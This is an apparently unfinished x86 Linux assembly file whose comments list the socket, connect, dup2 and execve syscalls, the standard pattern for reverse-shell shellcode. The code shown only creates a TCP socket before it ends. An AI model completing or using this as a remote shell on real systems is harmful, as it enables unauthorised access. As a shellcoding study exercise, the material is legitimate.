; socket 359	socket	man/ cs/	0x167	int	int	int
; connect 362	connect	man/ cs/	0x16a	int	struct sockaddr *	int
; dup2  63	dup2	man/ cs/	0x3f	unsigned int oldfd	unsigned int newfd
; execve 11	execve	man/ cs/	0x0b	const char *filename	const char *const *argv	const char *const *envp

global _start

section .text:
_start:
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx

        mov eax, 0x167
        mov bl, 0x2
        mov cl, 0x1
        mov dl, 6
        int 0x80

        














